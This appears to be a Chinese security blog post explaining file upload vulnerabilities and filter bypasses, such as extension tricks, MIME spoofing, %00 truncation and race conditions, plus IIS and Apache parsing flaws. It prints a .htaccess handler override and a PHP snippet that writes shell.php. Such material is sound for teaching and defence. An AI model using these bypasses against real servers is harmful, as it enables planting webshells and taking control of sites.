+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Shalom`s Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/XSS/" style="font-size: 1.05rem;">XSS<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">web安全<sup>2</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/" style="font-size: 1.05rem;">博客教程<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A/" style="font-size: 1.05rem;">漏洞报告<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/" itemprop="url">web安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>网络安全</span></a><a class="article-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web安全</span></a><a class="article-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>文件上传</span></a></span></div></div><h1 class="post-title" itemprop="name headline">文件上传漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-10-28T03:32:06.000Z" title="发表于 2024-10-28 11:32:06">2024-10-28</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-10-28T03:39:11.503Z" title="更新于 2024-10-28 11:39:11">2024-10-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">10.6k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>40分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="文件上传漏洞"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为Universe"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>Universe</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#post-comment" tabindex="-1"><span id="twikoo-count"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://img.shalom86012.eu.org/imgs/wallhaven-5dg579.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://blog.shalom86012.eu.org/2024/10/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/" itemprop="url">web安全</a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">网络安全</a><a href="/tags/web%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">web安全</a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" tabindex="-1" itemprop="url">文件上传</a><h1 id="CrawlerTitle" itemprop="name headline">文件上传漏洞</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Shalom</span><time itemprop="dateCreated datePublished" datetime="2024-10-28T03:32:06.000Z" title="发表于 2024-10-28 11:32:06">2024-10-28</time><time itemprop="dateCreated datePublished" datetime="2024-10-28T03:39:11.503Z" title="更新于 2024-10-28 11:39:11">2024-10-28</time></header><h1 id="1-文件上传漏洞基础"><a href="#1-文件上传漏洞基础" class="headerlink" title="1 文件上传漏洞基础"></a>1 文件上传漏洞基础</h1><p>文件上传漏洞是指在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户可以上传恶意的脚本文件，有可能获取执行服务端命令的能力。</p>
+<blockquote>
+<p>这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
+</blockquote>
+<h2 id="1-1-文件上传实战思路"><a href="#1-1-文件上传实战思路" class="headerlink" title="1.1 文件上传实战思路"></a>1.1 文件上传实战思路</h2><p>文件上传和文件执行是两个东西。</p>
+<p><strong>思路：</strong></p>
+<p>如果有一个网站，要从文件上传的方向开始；</p>
+<p>先看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;；</p>
+<p>如果有，如何找：字典扫描，扫描会员中心等可能存在文件上传的位置。</p>
+<p>找到后，如何利用：验证&#x2F;绕过。</p>
+<h1 id="2-文件上传绕过分类"><a href="#2-文件上传绕过分类" class="headerlink" title="2 文件上传绕过分类"></a>2 文件上传绕过分类</h1><h2 id="2-1-前端检测"><a href="#2-1-前端检测" class="headerlink" title="2.1 前端检测"></a>2.1 前端检测</h2><p>主要是通过<code>javascript</code>代码进行检测，非常容易绕过。</p>
+<p><strong>操作</strong>：</p>
+<p>F12查看相关代码，删除引用相关js函数的代码，或修改返回值为true，或禁用js等。</p>
+<h2 id="2-2-黑名单"><a href="#2-2-黑名单" class="headerlink" title="2.2 黑名单"></a>2.2 黑名单</h2><p>黑名单就是服务端明确不让上传的文件后缀，例如：rar、php、zip等。</p>
+<h3 id="2-2-1-特殊后缀"><a href="#2-2-1-特殊后缀" class="headerlink" title="2.2.1 特殊后缀"></a>2.2.1 特殊后缀</h3><p>特殊解析后缀绕过是由于黑名单过滤规则不严谨，在某些特定的情况下的后缀也能够被当作php文件进行解析，例如PHP2、php3、php4、phtml、pht等情况。</p>
+<p><strong>php</strong>：<code>php、php3、php4、php5、php7、pht、phtml、phar</code>，在配置文件夹中需要将AddType application&#x2F;x-httpd-php .php .phtml .phps .php1 .php4 .pht 这样的一段话前面的注释删除，重启phpstudy让其生效。</p>
+<blockquote>
+<p>ASP：asa、cer、cdx<br>ASPX：ascx、ashx、asac<br>JSP：jspx、jspf</p>
+</blockquote>
+<h3 id="2-2-2-htaccess解析-Apache"><a href="#2-2-2-htaccess解析-Apache" class="headerlink" title="2.2.2 .htaccess解析 (Apache)"></a>2.2.2 .htaccess解析 (Apache)</h3><p><strong>原理</strong>：</p>
+<p>.htaccess是Apache提供的一种可作用于当前目录及其子目录的特殊配置文件，如果网站开启了.htaccess功能，攻击者可能上传.htaccess文件覆盖apache文件解析规则，从而导致解析漏洞产生。</p>
+<p><strong>操作</strong>：</p>
+<p>上传.htaccess文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>意思是把任意文件都当做php文件解析。如果双引号内写入”x.jpg”，意思是把该目录下的x.jpg当做php文件解析。</p>
+<p>再上传图片马x.jpg，访问该图片即可。</p>
+<h3 id="2-2-3-大小写绕过"><a href="#2-2-3-大小写绕过" class="headerlink" title="2.2.3 大小写绕过"></a>2.2.3 大小写绕过</h3><p>服务端未将后缀进行统一的格式转换，同时由于Windows系统对后缀大小写并不敏感，所以将PHP改成Php也会被当作PHP进行解析。</p>
+<h3 id="2-2-4-点绕过-Windows"><a href="#2-2-4-点绕过-Windows" class="headerlink" title="2.2.4 点绕过 (Windows)"></a>2.2.4 点绕过 (Windows)</h3><p>利用了Windows对文件和文件名的限制，当将点放在结尾的时候，就会触发操作系统的命名规范问题，所以在生成文件的时候，添加在结尾的点就会被去除。</p>
+<p><strong>操作</strong>：</p>
+<p>抓包拦截，在文件名后加一个点。例如：<code>1.php.</code> 。</p>
+<blockquote>
+<p>部分情况下，过滤是一次性的，只删除一次点，可以抓包并在文件名后添加<strong>点空格点</strong>来绕过。</p>
+</blockquote>
+<h3 id="2-2-5-空格绕过-Windows"><a href="#2-2-5-空格绕过-Windows" class="headerlink" title="2.2.5 空格绕过 (Windows)"></a>2.2.5 空格绕过 (Windows)</h3><p>有些web后端没有对文件名进行去除空格处理，而黑名单中又没有对这样的文件后缀名过滤，当我们上传一个类似于<code>1.php空格  </code>的文件这样就会成功上传到服务器的目录中。在服务器中，空格会被系统自动去除。</p>
+<p><strong>操作</strong>：</p>
+<p>抓包拦截，文件名后加空格，例如：<code>1.php空格</code> 。</p>
+<h3 id="2-2-6-DATA绕过-Windows"><a href="#2-2-6-DATA绕过-Windows" class="headerlink" title="2.2.6 ::$DATA绕过 (Windows)"></a>2.2.6 ::$DATA绕过 (Windows)</h3><p>在window中，如果文件名后加上”<code>::$DATA</code>“，会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code>之前的文件名。</p>
+<p><strong>操作</strong>：</p>
+<p>抓包拦截，在文件名后加<code>::$DATA</code>，例如：<code>1.php::$DATA</code> 。</p>
+<h3 id="2-2-7-双写绕过"><a href="#2-2-7-双写绕过" class="headerlink" title="2.2.7 双写绕过"></a>2.2.7 双写绕过</h3><p>服务端可能存在将后缀替换为空的情况，但是可能只过滤了一次，所以就出现了可以通过双写绕过的可能。</p>
+<p>过滤是从左到右进行匹配。所以可以把php双写成pphphp。</p>
+<h2 id="2-3-白名单"><a href="#2-3-白名单" class="headerlink" title="2.3 白名单"></a>2.3 白名单</h2><p>白名单就是服务端明确可以上传的格式后缀，例如：jpg、png、jpeg等。</p>
+<h3 id="2-3-1-MIME绕过"><a href="#2-3-1-MIME绕过" class="headerlink" title="2.3.1 MIME绕过"></a>2.3.1 MIME绕过</h3><p>服务端MIME类型检测是通过检查http中包含的Content-Type字段中的值来判断上传文件是否合法的。所以修改content-type就可以绕过。</p>
+<blockquote>
+<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME消息包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="left">文件扩展名</th>
+<th align="left">Mime-Type</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">.js</td>
+<td align="left">application&#x2F;x-javascript</td>
+</tr>
+<tr>
+<td align="left">.html</td>
+<td align="left">text&#x2F;html</td>
+</tr>
+<tr>
+<td align="left">.jpg</td>
+<td align="left">image&#x2F;jpeg</td>
+</tr>
+<tr>
+<td align="left">.png</td>
+<td align="left">image&#x2F;png</td>
+</tr>
+<tr>
+<td align="left">.pdf</td>
+<td align="left">application&#x2F;pdf</td>
+</tr>
+<tr>
+<td align="left">.xml</td>
+<td align="left">test&#x2F;xml</td>
+</tr>
+<tr>
+<td align="left">.xhtml</td>
+<td align="left">application&#x2F;xhtml+xml</td>
+</tr>
+<tr>
+<td align="left">.xls</td>
+<td align="left">application&#x2F;vnd.ms-excel</td>
+</tr>
+<tr>
+<td align="left">.txt</td>
+<td align="left">text&#x2F;plain</td>
+</tr>
+<tr>
+<td align="left">.rtf</td>
+<td align="left">application&#x2F;rtf</td>
+</tr>
+<tr>
+<td align="left">.pdf</td>
+<td align="left">application&#x2F;pdf</td>
+</tr>
+<tr>
+<td align="left">.word .doc</td>
+<td align="left">application&#x2F;msword</td>
+</tr>
+<tr>
+<td align="left">.au</td>
+<td align="left">audio&#x2F;basic</td>
+</tr>
+</tbody></table>
+<p><strong>操作</strong>:</p>
+<p>上传文件，抓包拦截，将Content-Type的值修改为image&#x2F;jpeg等允许的类型。</p>
+<h3 id="2-3-2-00截断"><a href="#2-3-2-00截断" class="headerlink" title="2.3.2 %00截断"></a>2.3.2 %00截断</h3><p>%00不是代表空格，而是null，一个空字符，当程序执行到%00后，后面的数据就会停止，意思就是误当作结束符，把后面的数据直接忽略了，这就会导致漏洞产生。</p>
+<p>文件上传时，文件扩展名验证会对包含%00后面的整个扩展名进行验证，但保存时只保存%00前面的文件名。</p>
+<p><strong>环境</strong></p>
+<blockquote>
+<p>php&lt;5.3，magic_quotes_gpc&#x3D;off</p>
+</blockquote>
+<p><strong>操作</strong></p>
+<p>上传图片马，抓包拦截，如果文件名在请求包的第一行URL中(请求行)，修改为<code>1.php%00</code>，保存后的文件名为1.php；如果文件名在下方请求体中，在文件名后加任意一个字符(以数字1为例)，点击Hex来查看16进制的请求包，找到刚才添加的字符位置，将其（1的16进制为31）改为00，放行，或者在文件名后加上%00，选中%00，右键-&gt;转换选中内容-&gt;URL-&gt;URL解码。</p>
+<h2 id="2-4-内容及其他"><a href="#2-4-内容及其他" class="headerlink" title="2.4 内容及其他"></a>2.4 内容及其他</h2><h3 id="2-4-1-文件头检测"><a href="#2-4-1-文件头检测" class="headerlink" title="2.4.1 文件头检测"></a>2.4.1 文件头检测</h3><p>文件头是文件开头的一段二进制码，不同类型的图片也就会有不同的二进制头。</p>
+<blockquote>
+<p>JPEG (jpg)，文件头：FF D8 FF E0 (E0~EF)<br>PNG (png)，文件头：89 50 4E 47 (�PNG)<br>GIF (gif)，文件头：47 49 46 38 39 61 (GIF89a)</p>
+</blockquote>
+<h3 id="2-4-2-二次渲染"><a href="#2-4-2-二次渲染" class="headerlink" title="2.4.2 二次渲染"></a>2.4.2 二次渲染</h3><p> 二次渲染就是在我们上传的图片后，网站会对图片进行二次处理，比如对图片的尺寸、格式、以及网站对图片进行定义的一些要求等进行处理，并且服务器会对里面的内容进行二次替换更新，在处理完后，会生成一个合规的图片在网站上显示出来。</p>
+<p><strong>操作</strong></p>
+<p>把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。</p>
+<h3 id="2-4-3-条件竞争"><a href="#2-4-3-条件竞争" class="headerlink" title="2.4.3 条件竞争"></a>2.4.3 条件竞争</h3><p>在源代码中是存在校验的，但是校验是在文件上传后，才开始校验，也就是文件先上传至服务器中，然后服务器会对该文件进行校验，当符合的时候则会对文件进行重命名，当文件不符合要求的时候就对将文件进行删除。</p>
+<p>在服务器对文件删除前进行访问，由于文件在访问过程中，服务器是无法删除的，所以就可以利用这个节点实现条件竞争。</p>
+<p><strong>操作</strong></p>
+<p>上传的文件内容可以为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>意思是新建一个shell.php文件。</p>
+<h3 id="2-4-4-突破getimagesize"><a href="#2-4-4-突破getimagesize" class="headerlink" title="2.4.4 突破getimagesize"></a>2.4.4 突破getimagesize</h3><p><code>getimagesize</code>函数是用于获取图像大小及相关信息，成功返回一个数组，失败则返回false产生一条e_warning级的错误信息。</p>
+<p>通过对图片及代码进行合成为图片马，这个时候getimagesize函数既可以获取图片信息，配合解析漏洞，将图片马当作php文件解析，从而绕过getimagesize函数的限制。</p>
+<h3 id="4-5-突破exif-imagetype"><a href="#4-5-突破exif-imagetype" class="headerlink" title="4.5 突破exif_imagetype"></a>4.5 突破exif_imagetype</h3><p><code>exif_imagetype()</code>读取图像的第一个字节并检查其签名。当找到正确的签名时，将返回适当的常量值，否则返回值为FALSE。 </p>
+<p>可以通过制作图片马绕过，再配合文件包含漏洞解析文件来获取服务器配置信息。</p>
+<hr>
+<h1 id="3-解析漏洞"><a href="#3-解析漏洞" class="headerlink" title="3 解析漏洞"></a>3 解析漏洞</h1><p>解析漏洞就是指服务器应用程序在解析某些精心构造的后缀文件的时候，会将相关的文件解析成网页的脚本，从而导致实现控制网站，同时大部分的解析漏洞都是由应用程序产生的。</p>
+<h2 id="3-1-IIS解析漏洞"><a href="#3-1-IIS解析漏洞" class="headerlink" title="3.1 IIS解析漏洞"></a>3.1 IIS解析漏洞</h2><h3 id="3-1-1-IIS5-0-6-0"><a href="#3-1-1-IIS5-0-6-0" class="headerlink" title="3.1.1 IIS5.0&#x2F;6.0"></a>3.1.1 IIS5.0&#x2F;6.0</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>在以.asp为文件夹名的文件夹下的任何文件都将作为asp文件执行。</p>
+<p>也就是当目录为XX.asp的时候，那么当访问该目录下的图片的时候，如XX.aps&#x2F;1.jpg就会被当作ASP执行。</p>
+<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>如果文件名为<code>1.asp;.jpg</code>，由于IIS不解析<code>;</code>后面的内容，就会把文件当作1.asp进行解析，同时还存在.asa、.cer、.cdx也可以进行解析。</p>
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol>
+<li>限制上传目录的执行权限，不允许执行脚本。</li>
+<li>不允许创建目录。</li>
+<li>上传的文件进行重命名。</li>
+</ol>
+<h3 id="3-1-2-IIS7-0-IIS7-5"><a href="#3-1-2-IIS7-0-IIS7-5" class="headerlink" title="3.1.2 IIS7.0&#x2F;IIS7.5"></a>3.1.2 IIS7.0&#x2F;IIS7.5</h3><h4 id="IIS7-0-IIS7-5-Fast-CGI"><a href="#IIS7-0-IIS7-5-Fast-CGI" class="headerlink" title="IIS7.0&#x2F;IIS7.5 Fast-CGI"></a>IIS7.0&#x2F;IIS7.5 Fast-CGI</h4><p>由于php配置文件中<code>cgi.fix_pathinfo=1</code>，文件不存在时会修正路径向前递归解析，因此导致访问文件时在路径后添加任意以“.php”结尾的路径名即可将该文件以php格式执行。例如：1.jpg&#x2F;.php会被当做php解析。</p>
+<p><strong>环境</strong></p>
+<blockquote>
+<ol>
+<li><p>php.ini里的cgi.fix_pathinfo&#x3D;1</p>
+</li>
+<li><p>IIS7在FastCGl运行模式下</p>
+</li>
+</ol>
+</blockquote>
+<p><strong>操作</strong></p>
+<p>上传图片马，访问该图片时，图片名后加&#x2F;.php。</p>
+<p>或者 图片马内容包含以下内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问后，新建一个shell.php。</p>
+<h2 id="3-2-Apache解析漏洞"><a href="#3-2-Apache解析漏洞" class="headerlink" title="3.2 Apache解析漏洞"></a>3.2 Apache解析漏洞</h2><blockquote>
+<p>参考教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32277727/article/details/136141702">https://blog.csdn.net/qq_32277727/article/details/136141702</a></p>
+</blockquote>
+<h3 id="3-2-1-Apache换行解析漏洞"><a href="#3-2-1-Apache换行解析漏洞" class="headerlink" title="3.2.1 Apache换行解析漏洞"></a>3.2.1 Apache换行解析漏洞</h3><p>漏洞编号：CVE-2017-15715</p>
+<p>版本：2.4.0~2.4.29</p>
+<p><strong>原理</strong>：</p>
+<p>在解析PHP时，1.php\x0A将被当做PHP进行解析，导致绕过一些服务器的安全策略。</p>
+<p><strong>操作</strong>：</p>
+<p>上传php文件，Burpsuite抓包拦截，在文件名后加任意一个字符（以数字1为例），点击Hex来查看这个请求包的16进制模式，找到刚才添加的任意字符所在位置，将其对应的16进制（1的16进制为31）改为<strong>0a</strong>，再放行该请求即可。访问*&#x2F;1.php%0a能够成功解析。</p>
+<h3 id="3-2-2-Apache多后缀解析漏洞"><a href="#3-2-2-Apache多后缀解析漏洞" class="headerlink" title="3.2.2 Apache多后缀解析漏洞"></a>3.2.2 Apache多后缀解析漏洞</h3><p><strong>原理</strong>：</p>
+<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令，比如配置文件中有这项的话：<code>AddHandler application/x-httpd-php .php</code>，在有多个后缀的情况下，只要一个文件含有.php后缀的文件就会被识别成PHP文件,没必要是最后一个后缀。</p>
+<p>此外，apache解析文件的时候有一个原则就是，以.后面的扩展名来解析，当遇见不认识的扩展名的时候，就会从后向前解析，直到遇到能够解析的后缀名为止。</p>
+<p>多用于绕过黑名单的检查。</p>
+<p><strong>操作</strong>：</p>
+<p>上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，文件内容可以是<code>&lt;?=phpinfo()?&gt;</code>。</p>
+<h3 id="3-2-3-特殊后缀解析"><a href="#3-2-3-特殊后缀解析" class="headerlink" title="3.2.3 特殊后缀解析"></a>3.2.3 特殊后缀解析</h3><p><strong>原理</strong>：</p>
+<p>以php5.6为例，php配置文件中正则表达式”<code>.+\.ph(p[3457]?|t|tml)$</code>“匹配到以<code>php、php3、php4、php5、php7、pht、phtml</code>后缀名结尾的文件时会把文件交给php解析器执行。同理，对于php7.4，默认可匹配的后缀名有：<code>phar、php、phtml</code>。</p>
+<h3 id="3-2-4-htaccess解析漏洞"><a href="#3-2-4-htaccess解析漏洞" class="headerlink" title="3.2.4 .htaccess解析漏洞"></a>3.2.4 .htaccess解析漏洞</h3><p><strong>原理</strong>：</p>
+<p>.htaccess是Apache提供的一种可作用于当前目录及其子目录的特殊配置文件，如果网站开启了.htaccess功能，攻击者可能上传.htaccess文件覆盖apache文件解析规则，从而导致解析漏洞产生。</p>
+<p><strong>操作</strong>：</p>
+<p>上传.htaccess文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>意思是把任意文件都当做php文件解析。如果双引号内写入”x.jpg”，意思是把该目录下的x.jpg当做php文件解析。</p>
